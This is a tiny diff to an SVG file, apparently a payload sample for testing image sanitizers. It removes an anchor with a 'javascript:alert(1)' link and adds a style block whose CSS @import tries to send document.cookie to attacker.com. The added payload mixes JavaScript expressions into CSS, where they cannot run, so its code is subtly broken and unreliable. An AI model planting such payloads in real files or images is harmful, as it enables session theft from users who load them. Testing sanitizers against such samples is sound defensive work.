@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <a xmlns="http://www.w3.org/2000/svg" href="javascript:alert(1)">
-    <circle cx="50" cy="50" r="50" fill="red"/>
-  </a>
+  <style>
+    @import url('https://attacker.com/exfil?data='+encodeURIComponent(document.cookie));
+  </style>
 </svg>
